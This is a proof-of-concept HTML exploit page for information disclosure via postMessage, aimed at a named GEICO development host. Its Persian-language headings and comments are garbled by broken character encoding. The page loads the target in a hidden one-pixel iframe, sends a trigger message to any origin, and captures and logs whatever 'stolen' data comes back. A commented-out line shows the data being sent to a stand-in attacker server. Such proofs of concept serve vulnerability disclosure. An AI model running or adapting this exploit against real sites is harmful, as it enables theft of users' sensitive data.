<!DOCTYPE html>
<html>
<head>
    <title>PoC - Information Disclosure via postMessage</title>
</head>
<body>
    <h2>๐ฃ ุงฺฉุณูพููุช ูุดุช ุงุทูุงุนุงุช ุงุฒ ุทุฑู postMessage ๐ฃ</h2>
    <p>ูุทูุงู ฺฉูุณูู ูุฑูุฑฺฏุฑ (F12) ุฑุง ุจุฑุฑุณ ฺฉูุฏ ุชุง ุฏุงุฏูโูุง ุฏุฒุฏุฏู ุดุฏู ุฑุง ุจุจูุฏ.</p>
    
    <iframe id="victimFrame" src="https://casers-dv1.geico.com/" style="width:1px; height:1px; border:none; visibility:hidden;"></iframe>

    <script>
        // ุขุฏุฑุณ iFrame ูุฏู ุฑุง ุฏุฑ ูุชุบุฑ victim ุฐุฎุฑู ูโฺฉูู
        var victim = document.getElementById("victimFrame").contentWindow;

        // --- ฑ. ุฑุงู ุงูุฏุงุฒ ุดููุฏ ฺฉููุฏู ุจุฑุง ุฏุฑุงูุช ุงุทูุงุนุงุช ุฏุฒุฏุฏู ุดุฏู ---
        window.addEventListener("message", function(event) {
            
            // ูุง ุงูุชุธุงุฑ ุฏุงุฑู Origin ูุง ููุฑุฏ ุญููู ูุฑุงุฑ ฺฏุฑุฏุ ุงูุง ุจุฑุง ููุงุด ุฎูุจ ุงุณุช
            // ฺฉู ููู ฺุฒ ุฑุง ูุงฺฏ ฺฉูู.
            console.log("--- ูพุงู ุฏุฒุฏุฏู ุดุฏู (Captured Message) ---");
            console.log("Origin ูุฑุณุชูุฏู (ุงุญุชูุงูุงู ุณุงุช ูุฑุจุงู):", event.origin);
            
            try {
                // ููุงุด ุงุทูุงุนุงุช ุญุณุงุณ
                var stolenData = JSON.parse(event.data);
                console.log("โ ุงุทูุงุนุงุช ุญุณุงุณ ุฏุฒุฏุฏู ุดุฏู (JSON):", stolenData);
                alert("SUCCESS! Data Stolen:\n" + event.data);
                
                // ุฏุฑ ฺฉ ุญููู ูุงูุนุ ุงุทูุงุนุงุช ุจู ุณุฑูุฑ ููุงุฌู ุงุฑุณุงู ูโุดูุฏ
                // fetch('https://evil-server.com/log?data=' + encodeURIComponent(event.data));

            } catch (e) {
                console.log("Received non-JSON data or unexpected format.");
            }
        });

        // --- ฒ. ุงุฑุณุงู ูพุงู ูุงุดูโฺฉุด (Trigger) ุจุฑุง ุดุฑูุน ุญููู ---
        document.getElementById("victimFrame").onload = function() {
            console.log("ูุฏู ููุฏ ุดุฏ. ุงุฑุณุงู ูพุงู ูุงุดูโฺฉุด...");
            
            // ุงู Payload ุฏููุงู ููุงู ฺุฒ ุงุณุช ฺฉู ฺฉุฏ ุขุณุจโูพุฐุฑ ุงูุชุธุงุฑ ุฏุงุฑุฏ
            var triggerPayload = JSON.stringify({ action: "Initialized" });
            
            // ูุง ูพุงู ุฑุง ุจู iFrame ุงุฑุณุงู ูโฺฉูู. ุงุณุชูุงุฏู ุงุฒ '*' ุฏุฑ ุงูุฌุง ุจุฑุง ููุงุฌู ูุดฺฉู ูุฏุงุฑุฏ.
            victim.postMessage(triggerPayload, "*"); 
            console.log("Payload ุงุฑุณุงู ุดุฏ.");
        };
    </script>
</body>
</html>
